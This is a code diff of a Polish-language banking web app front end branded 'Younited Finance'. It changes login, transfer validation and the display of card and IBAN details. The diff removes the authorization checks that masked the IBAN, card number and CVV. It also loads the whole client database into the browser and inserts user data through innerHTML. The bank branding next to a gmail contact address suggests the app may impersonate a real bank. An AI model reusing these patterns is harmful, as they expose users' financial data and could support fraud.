@@ -1,23 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
 import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
-// ===== LANGUE FIXE DE L'APPLICATION : POLONAIS =====
-// La langue est volontairement fixe. Le compte, les notifications et les emails
-// utilisent le contenu polonais original, sans fallback ni paramètre de route.
-const FIXED_LANGUAGE = 'pl';
-let currentLanguage = FIXED_LANGUAGE;
-function setLanguage() {
-  currentLanguage = FIXED_LANGUAGE;
-  if (document && document.documentElement) document.documentElement.lang = FIXED_LANGUAGE;
-  return FIXED_LANGUAGE;
-}
-function getLanguage() { return FIXED_LANGUAGE; }
-function t(text) { return text; }
-function translateContent(content) { return content; }
-function applyTranslations() { return; }
-function installDynamicTranslationObserver() { return; }
-// ===== FIN DE LA LANGUE FIXE =====
-
 const firebaseConfig = {
   apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNlEk",
   authDomain: "vantex-admin-2026.firebaseapp.com",
@@ -30,12 +13,8 @@ const firebaseConfig = {
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
-setLanguage();
 
-const authModule = await import("https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js");
-// L’application ne lit jamais le compte avant l’authentification Firebase.
-// Sinon la base peut répondre sans profil et l’écran retombe à tort sur le polonais.
-await authModule.signInAnonymously(authModule.getAuth(app));
+await import("https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js").then(m=>m.signInAnonymously(m.getAuth(app)));
 
 let user = null;
 let currentHistory = [];
@@ -86,7 +65,6 @@ function showFieldError(fieldId, message) {
     errorEl.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#f97316;font-size:16px;flex-shrink:0;"></i><span>' + message + '</span>';
     errorEl.classList.add('visible');
   }
-  message = t(message);
   if (inputEl) {
     inputEl.classList.add('input-error');
     const wrapper = inputEl.closest('.input-wrapper');
@@ -342,8 +320,8 @@ const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte,
 
     const footerTextPlain = 'W przypadku pytań skontaktuj się z nami: noreply.kontakt.pl@gmail.com';
 
-    const htmlContent = translateContent(`<!DOCTYPE html>
-<html lang="${getLanguage()}">
+    const htmlContent = `<!DOCTYPE html>
+<html lang="pl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -472,9 +450,9 @@ const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte,
   </td></tr>
 </table>
 </body>
-</html>`);
+</html>`;
 
-    const textContent = translateContent(`Younited – POTWIERDZENIE PRZELEWU
+    const textContent = `Younited – POTWIERDZENIE PRZELEWU
 
 Status: ${statusLabel}
 ${mainStatus}
@@ -494,7 +472,7 @@ ${nextTitle}
 ${nextText}
 
 ${footerTextPlain}
-© 2026 Younited Finance.`);
+© 2026 Younited Finance.`;
 
     const res = await fetch(API_URL, {
       method: 'POST',
@@ -780,23 +758,11 @@ function showBlockedMsg() {
   if (blockedMsg) blockedMsg.style.display = 'block';
 }
 
-function applyClientTranslationsSafely() {
-  try {
-    applyTranslations(document);
-    installDynamicTranslationObserver();
-  } catch (error) {
-    console.error('Erreur de traduction client (connexion conservée):', error);
-  }
-}
-
 function updateClientDisplay(data) {
   if (!data) {
     showBanned();
     return;
   }
-  // Tous les comptes utilisent le polonais fixe.
-  window.__appliedClientLanguage = FIXED_LANGUAGE;
-  setLanguage();
   const nameEl = document.getElementById('client-name');
   const nameValueEl = document.getElementById('client-name-value');
   if (nameEl && data.nom) {
@@ -859,7 +825,7 @@ if (window.__clientIdFromUrl) {
 
   if (!localStorage.getItem('Younited_session')) {
     showLoading('Weryfikacja konta...');
-    withLoginTimeout(get(ref(db, 'clients/' + window.__clientIdFromUrl)), 'La vérification du compte', 12000).then((snap) => {
+    get(ref(db, 'clients/' + window.__clientIdFromUrl)).then((snap) => {
       const data = snap.val();
       hideLoading();
 
@@ -883,15 +849,9 @@ if (window.__clientIdFromUrl) {
       newUrl.searchParams.set('theme', encodeURIComponent(data.theme || 'teal'));
       window.history.replaceState({}, '', newUrl.toString());
 
-    }).catch((error) => {
-      console.error('Erreur vérification compte:', error);
+    }).catch(() => {
       hideLoading();
       show('login');
-      const initialError = document.getElementById('err');
-      if (initialError) {
-        initialError.textContent = 'Impossible de vérifier le compte : ' + (error && error.message ? error.message : 'réessayez');
-        initialError.classList.remove('hidden');
-      }
     });
   }
 } else if (!localStorage.getItem('Younited_session')) {
@@ -1016,10 +976,7 @@ function updateBalanceDisplay(balanceElement, statElement, amount) {
 function updateBankData(data) {
   if (!data) return;
   document.getElementById('ibanOwner').textContent = data.ibanOwner || 'KWIATKOWSKI PW';
-  ibanRevealAuthorized = data.allowIbanReveal === true;
-  cardRevealAuthorized = data.allowCardReveal === true;
-  cvvRevealAuthorized = data.allowCvvReveal === true;
-  document.getElementById('ibanNumber').textContent = maskIban(data.iban || 'PL00000000000000000000000000');
+  document.getElementById('ibanNumber').textContent = data.iban || 'LT15 2339 1465 189X XXXX';
   document.getElementById('ibanBic').textContent = data.ibanBic || 'TTQGLTIJCJK';
   document.getElementById('ibanBank').textContent = data.ibanBank || 'Younited Finance';
   const holder = data.carteHolder || 'JAN KOWALSKI';
@@ -1030,7 +987,6 @@ function updateBankData(data) {
   const detailNumEl = document.getElementById('cardDetailNumber');
   const detailCvvEl = document.getElementById('cardDetailCvv');
   detailNumEl.dataset.realNumber = num;
-  cardVisible = false;
   detailCvvEl.dataset.realCvv = cvv;
   document.getElementById('cardHolderName').textContent = holder;
   document.getElementById('cardDetailHolder').textContent = holder;
@@ -2322,17 +2278,6 @@ async function forceLogout(isDeleted = false) {
   history.replaceState({ screen: 'login' }, '', '#login');
 }
 
-// Sécurité : aucune opération réseau ne doit laisser l’écran de connexion tourner indéfiniment.
-function withLoginTimeout(promise, label, timeoutMs = 10000) {
-  return Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error(label + ' a dépassé le délai')), timeoutMs))
-  ]);
-}
-
-// Convertit uniquement les anciennes écritures de la langue vers un code canonique.
-// Il n’y a aucun fallback : une valeur inconnue reste invalide.
-
 // ===== LOGIN =====
 window.login = async function(options = { silent: false, redirect: false }) {
   const btn = document.getElementById('loginBtn');
@@ -2358,7 +2303,7 @@ window.login = async function(options = { silent: false, redirect: false }) {
   }
 
   try {
-    const s = await withLoginTimeout(get(ref(db, 'clients')), 'La connexion à la base de données', 12000);
+    const s = await get(ref(db, 'clients'));
     const d = s.val() || {};
     let f = null,
       fid = null;
@@ -2410,13 +2355,8 @@ window.login = async function(options = { silent: false, redirect: false }) {
       return;
     }
 
-    // La langue est fixe : les anciennes valeurs Firebase sont ignorées.
-    const canonicalLanguage = 'pl';
     user = f;
     user._id = fid;
-    user.language = 'pl';
-    setLanguage();
-    applyClientTranslationsSafely();
     applyBgColor(user.bgColor || 'gray');
     if (!user.devise) user.devise = 'zł';
     if (!user.theme) user.theme = 'teal';
@@ -2433,7 +2373,7 @@ window.login = async function(options = { silent: false, redirect: false }) {
     document.getElementById('greet').innerHTML = `Witaj, <span>${user.nom}</span>`;
     adjustGreetingFontSize();
 
-    await withLoginTimeout(updateSession(true), 'La session', 10000);
+    await updateSession(true);
 
     const balElement = document.getElementById('bal');
     const statBalElement = document.getElementById('stat-balance');
@@ -2449,7 +2389,7 @@ window.login = async function(options = { silent: false, redirect: false }) {
 
     setupBankListener(fid);
 
-    await withLoginTimeout(initHistoryListener(fid), 'L’historique', 10000);
+    await initHistoryListener(fid);
     watchBalance(fid);
     watchClientStatus(fid);
 
@@ -2471,7 +2411,7 @@ window.login = async function(options = { silent: false, redirect: false }) {
     if (btn) btn.disabled = false;
   } catch (error) {
     console.error('Erreur login:', error);
-    err.textContent = 'Connexion impossible : ' + (error && error.message ? error.message : 'réessayez');
+    err.textContent = 'Erreur de connexion, réessayez';
     err.classList.remove('hidden');
     hideLoading();
     if (btn) btn.disabled = false;
@@ -2621,96 +2561,75 @@ function setupTransferValidation() {
   });
 
   // Désactiver le bouton au départ
+  const accountInput = document.getElementById('c');
+  if (accountInput) {
+    accountInput.addEventListener('input', () => validateRecipientAccount(true));
+    accountInput.addEventListener('blur', () => validateRecipientAccount(false));
+  }
   continueBtn.disabled = true;
 }
-
-// ===== DÉTECTION SILENCIEUSE BANQUE / BIC DEPUIS L'IBAN =====
-// Service public sans clé : la recherche est facultative et ne bloque jamais le formulaire.
-let ibanLookupTimer = null;
-let ibanLookupController = null;
-let ibanLookupSequence = 0;
-
-// Secours local pour les banques dont le service public ne possède pas encore de fiche.
-// Le registre peut être étendu sans modifier le flux de transfert.
-const LOCAL_IBAN_BANKS = {
-  // PL + checksum + bank code 10203017 : PKO Bank Polski
-  'PL:10203017': { name: 'PKO Bank Polski', bic: 'BPKOPLPW' }
+function normalizeRecipientAccount(value) {
+  return String(value || '').toUpperCase().replace(/\s+/g, '');
+}
+function isValidIban(value) {
+  const iban = normalizeRecipientAccount(value);
+  if (!/^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}$/.test(iban)) return false;
+  const rearranged = iban.slice(4) + iban.slice(0, 4);
+  const numeric = rearranged.replace(/[A-Z]/g, char => String(char.charCodeAt(0) - 55));
+  let remainder = 0;
+  for (const digit of numeric) remainder = (remainder * 10 + Number(digit)) % 97;
+  return remainder === 1;
+}
+function showRecipientInputError(message) {
+  const field = document.getElementById('c');
+  const error = document.getElementById('error-c');
+  if (field) field.classList.add('input-error');
+  if (error) { error.textContent = message; error.classList.add('visible'); }
+  const modal = document.getElementById('recipientInputAlert');
+  const text = document.getElementById('recipientInputAlertText');
+  if (text) text.textContent = message;
+  if (modal) modal.classList.remove('hidden');
+}
+window.closeRecipientInputAlert = function() {
+  const modal = document.getElementById('recipientInputAlert');
+  if (modal) modal.classList.add('hidden');
 };
-
-function getLocalBankFromIban(iban) {
-  const country = iban.substring(0, 2);
-  let bankCode = '';
-  if (country === 'PL' && iban.length >= 12) bankCode = iban.substring(4, 12);
-  return LOCAL_IBAN_BANKS[country + ':' + bankCode] || null;
-}
-
-function markBankFieldAsManual(field) {
-  if (field) field.dataset.userEdited = 'true';
-}
-
-function setAutoBankField(id, value) {
-  const field = document.getElementById(id);
-  if (!field || !value) return;
-  // Ne jamais écraser une valeur saisie ou modifiée par le client.
-  if (field.dataset.userEdited === 'true') return;
-  field.value = value;
-  field.dataset.autoFilled = 'true';
-}
-
-async function lookupBankFromIban() {
-  const ibanField = document.getElementById('c');
-  if (!ibanField) return;
-  const normalizedIban = ibanField.value.replace(/\s+/g, '').toUpperCase();
-  if (normalizedIban.length < 15 || !/^[A-Z]{2}[0-9A-Z]+$/.test(normalizedIban)) return;
-
-  const requestSequence = ++ibanLookupSequence;
-  const localBank = getLocalBankFromIban(normalizedIban);
-  if (localBank) {
-    setAutoBankField('e', localBank.name);
-    setAutoBankField('d', localBank.bic);
+function validateRecipientAccount(showPopup = false) {
+  const raw = document.getElementById('c')?.value || '';
+  const value = normalizeRecipientAccount(raw);
+  const error = document.getElementById('error-c');
+  const field = document.getElementById('c');
+  const validId = /^[A-Z]{2}\d{11}$/.test(value);
+  const validIban = isValidIban(value);
+  if (!value || validId || validIban) {
+    if (field) field.classList.remove('input-error');
+    if (error) { error.textContent = ''; error.classList.remove('visible'); }
+    if (validId) {
+      get(ref(db, 'clients')).then(snap => {
+        const clients = snap.val() || {};
+        const match = Object.values(clients).find(client => String(client.publicId || '').trim().toUpperCase() === value);
+        if (match && document.getElementById('c')?.value === raw) {
+          const beneficiary = document.getElementById('b');
+          if (beneficiary && !beneficiary.value.trim()) beneficiary.value = match.nom || '';
+        } else if (!match && document.getElementById('c')?.value === raw) {
+          showRecipientInputError('Cet ID client est valide, mais il ne correspond à aucun client.');
+        }
+      }).catch(() => {});
+    }
+    return true;
   }
-  if (ibanLookupController) ibanLookupController.abort();
-  ibanLookupController = new AbortController();
-
-  try {
-    const response = await fetch(
-      'https://openiban.com/validate/' + encodeURIComponent(normalizedIban) + '?getBIC=true&validateBankCode=true',
-      { method: 'GET', signal: ibanLookupController.signal, headers: { 'Accept': 'application/json' } }
-    );
-    if (!response.ok || requestSequence !== ibanLookupSequence) return;
-    const result = await response.json();
-    if (!result || !result.valid || !result.bankData) return;
-    setAutoBankField('e', result.bankData.name || '');
-    setAutoBankField('d', result.bankData.bic || '');
-  } catch (error) {
-    // Recherche silencieuse : aucune alerte et aucune interruption si le service est indisponible.
-    if (error.name !== 'AbortError') console.debug('Recherche banque IBAN indisponible');
-  }
+  const message = 'Veuillez saisir un numéro IBAN valide ou un ID client valide (2 lettres + 11 chiffres).';
+  if (field) field.classList.add('input-error');
+  if (error) { error.textContent = message; error.classList.add('visible'); }
+  if (showPopup) showRecipientInputError(message);
+  return false;
 }
-
-function setupIbanBankLookup() {
-  const ibanField = document.getElementById('c');
-  const bankField = document.getElementById('e');
-  const bicField = document.getElementById('d');
-  if (!ibanField) return;
-
-  [bankField, bicField].forEach(field => {
-    if (!field) return;
-    field.addEventListener('input', () => markBankFieldAsManual(field));
-  });
-
-  const scheduleLookup = () => {
-    clearTimeout(ibanLookupTimer);
-    ibanLookupTimer = setTimeout(lookupBankFromIban, 450);
-  };
-  ibanField.addEventListener('input', scheduleLookup);
-  ibanField.addEventListener('blur', scheduleLookup);
-}
+// ===== TRANSFERT =====
 
 // ===== TRANSFERT =====
 window.toVerify = function() {
   clearAllTransferErrors();
-
+  if (!validateRecipientAccount(true)) return;
   if (!validateAllTransferFields()) {
     return;
   }
@@ -2719,9 +2638,8 @@ window.toVerify = function() {
   const amt = Number(rawValue);
   const rawAccount = document.getElementById('c').value.trim();
   // Un ID client est saisi dans le champ IBAN. Les espaces sont ignorés pour faciliter la saisie.
-  const normalizedAccount = rawAccount.toUpperCase().replace(/\s+/g, '');
-  const looksLikeIban = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}$/.test(normalizedAccount);
-  const recipientId = (!looksLikeIban && /^[A-Z0-9_-]{3,32}$/.test(normalizedAccount)) ? normalizedAccount : '';
+  const normalizedAccount = normalizeRecipientAccount(rawAccount);
+  const recipientId = /^[A-Z]{2}\d{11}$/.test(normalizedAccount) ? normalizedAccount : '';
 
   document.getElementById('va').textContent = fmt(amt);
   document.getElementById('vb').textContent = document.getElementById('b').value;
@@ -3283,29 +3201,16 @@ function startProgress(amount, beneficiary, iban, bank, reason) {
 
 // ===== CARTE =====
 let cardVisible = false;
-let ibanRevealAuthorized = false;
-let cardRevealAuthorized = false;
-let cvvRevealAuthorized = false;
-function maskIban(value) {
-  const compact = String(value || '').replace(/\s/g, '');
-  if (!compact) return 'PL•••• •••• •••• ••••';
-  if (ibanRevealAuthorized) return compact.replace(/(.{4})/g, '$1 ').trim();
-  return compact.length > 4 ? compact.slice(0, -4) + '••••' : compact.replace(/./g, '•');
-}
 window.copyCardNumber = function() {
-  const num = document.getElementById('cardDetailNumber').textContent.trim();
+  const num = document.getElementById('cardDetailNumber').textContent.replace(/\s/g, '');
   navigator.clipboard.writeText(num).then(() => toast('✅ Numer skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
 };
 window.copyIban = function() {
-  const iban = document.getElementById('ibanNumber').textContent.trim();
+  const iban = document.getElementById('ibanNumber').textContent.replace(/\s/g, '');
   navigator.clipboard.writeText(iban).then(() => toast('✅ IBAN skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
 };
 window.toggleCardVisibility = function() {
-  if (!cardRevealAuthorized && !cvvRevealAuthorized) {
-    cardVisible = false;
-  } else {
-    cardVisible = !cardVisible;
-  }
+  cardVisible = !cardVisible;
   const eyeIcon = document.getElementById('eyeIcon');
   const eyeText = document.getElementById('eyeText');
   const cardNum = document.getElementById('cardNumber');
@@ -3317,11 +3222,9 @@ window.toggleCardVisibility = function() {
   if (cardVisible) {
     eyeIcon.className = 'fa-regular fa-eye-slash'; eyeText.textContent = 'Ukryj';
     const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12), p4 = realNum.substring(12,16);
-    if (cardRevealAuthorized) {
-      cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>${p4}</span>`;
-      detailNum.textContent = `${p1} ${p2} ${p3} ${p4}`;
-    }
-    if (cvvRevealAuthorized) { cvv.textContent = realCvv; detailCvv.textContent = realCvv; }
+    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>${p4}</span>`;
+    detailNum.textContent = `${p1} ${p2} ${p3} ${p4}`;
+    cvv.textContent = realCvv; detailCvv.textContent = realCvv;
   } else {
     eyeIcon.className = 'fa-regular fa-eye'; eyeText.textContent = 'Pokaż';
     const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12);
@@ -3339,10 +3242,10 @@ window.copyToClipboard = function(text) {
 
 // ===== TOAST =====
 window.toast = function(m) {
-  const toastElement = document.getElementById('t');
-  toastElement.textContent = t(m);
-  toastElement.style.display = 'block';
-  setTimeout(() => toastElement.style.display = 'none', 1500);
+  const t = document.getElementById('t');
+  t.textContent = m;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 1500);
 };
 
 // ===== RÉINITIALISATION DES VALIDITÉS PERSONNALISÉES =====
@@ -3354,7 +3257,6 @@ function setupCustomValidityReset() {
 function init() {
   setupCustomValidityReset();
   setupCodeValidation();
-  setupIbanBankLookup();
 }
 
 document.addEventListener('DOMContentLoaded', init);
@@ -3366,7 +3268,6 @@ setTimeout(() => {
     setupTransferValidation();
     setupRequiredMessages();
     setupCodeValidation();
-    setupIbanBankLookup();
   }
 }, 300);
 
@@ -3388,3 +3289,4 @@ setTimeout(() => {
   document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
   adjustAllTexts();
 }, 100);
+
